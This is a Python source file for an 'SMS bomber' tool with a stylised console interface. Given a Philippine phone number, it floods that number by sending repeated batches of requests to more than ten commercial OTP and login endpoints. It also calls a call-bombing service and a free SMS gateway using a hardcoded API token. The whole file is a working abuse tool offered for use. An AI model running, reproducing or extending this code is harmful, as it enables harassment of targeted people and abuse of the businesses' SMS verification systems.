import requests
import random
import string
import time
import json
from datetime import datetime
import os
import sys
import asyncio
import aiohttp
import pyreadline3 as readline
import re
from urllib.parse import urlencode
from typing import List, Dict, Tuple

class Colors:
    # Cyberpunk Palette
    CYAN = '\033[38;5;51m'      # Neon Cyan
    BLUE = '\033[38;5;33m'      # Electric Blue
    MAGENTA = '\033[38;5;201m'   # Hot Pink/Magenta
    GREEN = '\033[38;5;82m'     # Neon Green
    RED = '\033[38;5;196m'       # Bright Red
    YELLOW = '\033[38;5;226m'    # Bright Yellow
    GRAY = '\033[38;5;240m'      # Dark Gray
    WHITE = '\033[38;5;255m'     # Pure White
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    RESET = '\033[0m'
    
    # Backgrounds for pills
    BG_CYAN = '\033[48;5;51m\033[38;5;232m'
    BG_BLUE = '\033[48;5;33m\033[38;5;232m'

class UIComponents:
    @staticmethod
    def glitch_text(text):
        chars = list(text)
        glitch_chars = ["!", "@", "#", "$", "%", "^", "&", "*", "░", "▒", "▓"]
        if random.random() > 0.7:
            idx = random.randint(0, len(chars)-1)
            chars[idx] = f"{Colors.MAGENTA}{random.choice(glitch_chars)}{Colors.CYAN}"
        return "".join(chars)

    @staticmethod
    def draw_grid_line(width=80):
        print(f"{Colors.GRAY}{Colors.DIM}{'┼───' * (width // 4)}┼{Colors.RESET}")

    @staticmethod
    def header(text):
        width = 70
        print(f"\n{Colors.BLUE}┌{'─' * (width - 2)}┐{Colors.RESET}")
        print(f"{Colors.BLUE}│{Colors.CYAN}{Colors.BOLD}{text.center(width - 2)}{Colors.BLUE}│{Colors.RESET}")
        print(f"{Colors.BLUE}└{'─' * (width - 2)}┘{Colors.RESET}")

    @staticmethod
    def subheader(text):
        print(f"\n{Colors.CYAN}{Colors.BOLD}◣ {text} ◥{Colors.RESET}")
        print(f"{Colors.BLUE}{'━' * 30}{Colors.RESET}")

    @staticmethod
    def service_pill(name, active=True):
        color = Colors.CYAN if active else Colors.GRAY
        return f"{color}▕ {name} ▏{Colors.RESET}"

    @staticmethod
    def input_field(label, placeholder=""):
        print(f"{Colors.BLUE}╭─ {Colors.WHITE}{label} {Colors.BLUE}{'─' * (25 - len(label))}╮")
        val = input(f"{Colors.BLUE}│ {Colors.CYAN}❯ {Colors.RESET}")
        return val.strip() or placeholder

    @staticmethod
    def status_bar():
        now = datetime.now().strftime("%H:%M:%S")
        status = f"{Colors.GREEN}● SYSTEM ONLINE{Colors.RESET}"
        channel = f"{Colors.BLUE}ENCRYPTED CHANNEL ACTIVE{Colors.RESET}"
        ver = f"{Colors.GRAY}ver 3.0{Colors.RESET}"
        print(f"\n{Colors.GRAY}[{now}] {status} | {channel} | {ver}{Colors.RESET}")

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    # Digital Grid Background effect
    UIComponents.draw_grid_line()
    
    banner = rf"""
{Colors.CYAN}{Colors.BOLD}
    ██╗  ██╗███████╗███╗   ██╗██╗     ██╗   ██╗    ██████╗ ███████╗██╗   ██╗
    ██║ ██╔╝██╔════╝████╗  ██║██║     ╚██╗ ██╔╝    ██╔══██╗██╔════╝██║   ██║
    █████╔╝ █████╗  ██╔██╗ ██║██║      ╚████╔╝     ██║  ██║█████╗  ██║   ██║
    ██╔═██╗ ██╔══╝  ██║╚██╗██║██║       ╚██╔╝      ██║  ██║██╔══╝  ╚██╗ ██╔╝
    ██║  ██╗███████╗██║ ╚████║███████╗   ██║       ██████╔╝███████╗ ╚████╔╝ 
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝       ╚═════╝ ╚══════╝  ╚═══╝  
{Colors.RESET}"""
    
    # Add holographic layers / scanline distortion effect simulation
    lines = banner.split('\n')
    for line in lines:
        if line.strip():
            # Subtle scanline effect
            print(f"{Colors.BLUE}  {line}")
            if random.random() > 0.8:
                print(f"{Colors.CYAN}{Colors.DIM}  {line}")
    
    print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
    print(f"{Colors.BLUE}{Colors.BOLD}          [ HOLOGRAPHIC INTERFACE LOADED ]          {Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}\n")

def normalize_phone_number(phone):
    phone = phone.replace(' ', '')
    if phone.startswith('0'):
        return '+63' + phone[1:]
    elif phone.startswith('63') and not phone.startswith('+63'):
        return '+' + phone
    elif not phone.startswith('+63') and len(phone) == 10:
        return '+63' + phone
    elif not phone.startswith('+'):
        return '+63' + phone
    return phone

def random_string(length):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def random_gmail():
    return f"{random_string(8)}@gmail.com"

def random_uid():
    return random_string(28)

def random_device_id():
    return random_string(16)

class SMSBomber:
    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.custom_sender_name = "User"
        self.custom_message = "Test Message"

    def set_custom_data(self, sender_name="User", message="Test Message"):
        self.custom_sender_name = sender_name
        self.custom_message = message

    async def execute_attack(self, number_to_send, amount, delay_sec, selected_services=None):
        if selected_services is None:
            selected_services = self.get_all_services()
        
        UIComponents.header("DISPATCH INITIATED")
        print(f"{Colors.CYAN}   TARGET ID: {Colors.WHITE}{number_to_send}{Colors.RESET}")
        print(f"{Colors.CYAN}   BATCH LOAD: {Colors.WHITE}{amount}{Colors.RESET}")
        print(f"{Colors.CYAN}   MODULES: {Colors.WHITE}{len(selected_services)} ACTIVE{Colors.RESET}")
        
        for i in range(1, amount + 1):
            print(f"\n{Colors.MAGENTA}⚡ BATCH {i}/{amount} {Colors.BLUE}{'━' * 40}{Colors.RESET}")
            
            tasks = []
            service_names = []

            for service_name in selected_services:
                method_name = f"send_{service_name.lower()}"
                if hasattr(self, method_name):
                    tasks.append(getattr(self, method_name)(number_to_send))
                    service_names.append(service_name.replace('_', ' '))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for name, result in zip(service_names, results):
                status_icon = f"{Colors.GREEN}✔{Colors.RESET}" if result is True else f"{Colors.RED}✘{Colors.RESET}"
                status_text = f"{Colors.GREEN}STABLE{Colors.RESET}" if result is True else f"{Colors.RED}FAILED{Colors.RESET}"
                print(f"  {status_icon} {Colors.CYAN}{name:<20} {Colors.BLUE}» {status_text}")

            if i < amount:
                print(f"{Colors.YELLOW}   COOLDOWN: {delay_sec}s...{Colors.RESET}")
                await asyncio.sleep(delay_sec)

    # --- Service Methods ---
    async def send_custom_sms(self, number_to_send):
        try:
            normalized_number = normalize_phone_number(number_to_send)
            suffix = '-freed0m'
            credits = '\n\nCreated by: ANTRAX'
            final_text = f"{self.custom_message} {suffix}{credits}"
            command_array = ['free.text.sms', '421', normalized_number, '2207117BPG', 'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg', final_text]
            data = {'UID': random_uid(), 'humottaee': 'Processing', 'Email': random_gmail(), '$Oj0O%K7zi2j18E': json.dumps(command_array), 'device_id': random_device_id(), 'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c', 'Name': self.custom_sender_name}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post('https://sms.m2techtronix.com/v13/sms.php', data=urlencode(data), headers={'Content-Type': 'application/x-www-form-urlencoded'}) as resp:
                    if resp.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_ezloan(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.ezloan.ph/api/user/send-code', json={"mobile": num, "type": 1}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_xpress(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api-v2.xpress.ph/api/v1/login/otp', json={"phone": num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_abenson(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.abenson.com/api/otp/send', json={"mobile_number": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_excellent_lending(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.excellentlending.ph/api/v1/otp/send', json={"mobile": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_fortune_pay(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.fortunepay.ph/api/v1/otp/send', json={"mobile": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_wemove(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.wemove.ph/api/v1/otp/send', json={"mobile": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_lbc(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.lbcconnect.com/api/v1/otp/send', json={"mobile": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_pickup_coffee(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.pickup-coffee.com/api/v1/otp/send', json={"mobile": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_honey_loan(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.honeyloan.ph/api/v1/otp/send', json={"mobile": "0"+num}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_komo_ph(self, number_to_send):
        try:
            num = number_to_send[-10:]
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.komo.ph/api/otp/v5/generate', json={"mobile": "0"+num, "transactionType": 6}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_s5_otp(self, number_to_send):
        try:
            num = normalize_phone_number(number_to_send)
            async with aiohttp.ClientSession() as s:
                async with s.post('https://api.s5.com/player/api/v1/otp/request', data=f"phone_number={num}", headers={'content-type': 'application/x-www-form-urlencoded'}) as r:
                    if r.status == 200: self.success_count += 1; return True
            return False
        except: return False

    async def send_call_bomb(self, number_to_send):
        try:
            num = normalize_phone_number(number_to_send)
            async with aiohttp.ClientSession() as s:
                async with s.post("https://call-bomb.onrender.com/", json={"phone": num}) as r:
                    if r.status == 200:
                        res = await r.json()
                        if res.get('success'): self.success_count += 1; return True
            return False
        except: return False

    def get_all_services(self):
        return ["CUSTOM_SMS", "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING", "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE", "HONEY_LOAN", "KOMO_PH", "S5_OTP", "CALL_BOMB"]

    def get_stats(self):
        return {"success": self.success_count, "failed": self.fail_count, "total": self.success_count + self.fail_count}

async def main_menu():
    show_banner()
    UIComponents.status_bar()
    
    UIComponents.header("MESSAGE DISPATCH CONSOLE")
    
    # Display Service Tags as Glowing Pills
    print(f"\n{Colors.BLUE}ACTIVE MODULES:{Colors.RESET}")
    services = ["API", "SMS", "EMAIL", "WEBHOOK", "CALL"]
    pills = "  ".join([UIComponents.service_pill(s) for s in services])
    print(f"  {pills}\n")

    print(f"  {Colors.CYAN}[1] {Colors.WHITE}INITIALIZE DISPATCH{Colors.RESET}")
    print(f"  {Colors.CYAN}[2] {Colors.WHITE}MODULE CONFIGURATION{Colors.RESET}")
    print(f"  {Colors.CYAN}[3] {Colors.WHITE}SYSTEM ARCHIVE{Colors.RESET}")
    print(f"  {Colors.CYAN}[0] {Colors.RED}TERMINATE SESSION{Colors.RESET}")
    
    print(f"\n{Colors.BLUE}{'━' * 70}{Colors.RESET}")
    choice = input(f"{Colors.CYAN}KENLY_DEV@SYSTEM:~$ {Colors.RESET}")
    
    if choice == '1':
        await start_dispatch()
    elif choice == '2':
        await module_config()
    elif choice == '3':
        await about_system()
    elif choice == '0':
        print(f"{Colors.RED}SESSION TERMINATED.{Colors.RESET}")
        sys.exit(0)
    else:
        await main_menu()

async def start_dispatch():
    show_banner()
    UIComponents.header("DISPATCH PARAMETERS")
    
    target = UIComponents.input_field("Target Contact", "09123456789")
    batch_count = UIComponents.input_field("Batch Count", "10")
    delay = UIComponents.input_field("Delay (sec)", "2")
    
    # Validate
    if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', target.replace(' ', '')):
        print(f"{Colors.RED}ERR: INVALID TARGET FORMAT{Colors.RESET}")
        await asyncio.sleep(2)
        return await start_dispatch()

    try:
        batches = int(batch_count)
        delay_sec = int(delay)
    except:
        batches, delay_sec = 10, 2

    print(f"\n{Colors.BG_CYAN}  EXECUTE DISPATCH  {Colors.RESET}")
    confirm = input(f"{Colors.CYAN}Confirm Execution? (y/n): {Colors.RESET}")
    
    if confirm.lower() == 'y':
        bomber = SMSBomber()
        await bomber.execute_attack(target, batches, delay_sec)
        
        stats = bomber.get_stats()
        UIComponents.header("DISPATCH SUMMARY")
        print(f"  {Colors.GREEN}SUCCESSFUL: {stats['success']}")
        print(f"  {Colors.RED}FAILED:     {stats['failed']}")
        print(f"  {Colors.WHITE}TOTAL:      {stats['total']}")
        input(f"\n{Colors.CYAN}Press Enter to return...{Colors.RESET}")
        await main_menu()
    else:
        await main_menu()

async def module_config():
    show_banner()
    UIComponents.header("MODULE CONFIGURATION")
    bomber = SMSBomber()
    all_services = bomber.get_all_services()
    
    for i, s in enumerate(all_services, 1):
        print(f"  {Colors.CYAN}[{i:2d}] {Colors.WHITE}{s:<20} {Colors.GREEN}ONLINE{Colors.RESET}")
    
    print(f"\n  {Colors.CYAN}[0] BACK TO CONSOLE{Colors.RESET}")
    input(f"\n{Colors.CYAN}Select Module to Toggle: {Colors.RESET}")
    await main_menu()

async def about_system():
    show_banner()
    UIComponents.header("SYSTEM ARCHIVE")
    print(f"  {Colors.CYAN}CODENAME: {Colors.WHITE}KENLY DEV")
    print(f"  {Colors.CYAN}VERSION:  {Colors.WHITE}3.0.4-STABLE")
    print(f"  {Colors.CYAN}STATUS:   {Colors.GREEN}READY")
    print(f"  {Colors.CYAN}SECURITY: {Colors.BLUE}ENCRYPTED")
    input(f"\n{Colors.CYAN}Press Enter to return...{Colors.RESET}")
    await main_menu()

async def main():
    try:
        await main_menu()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
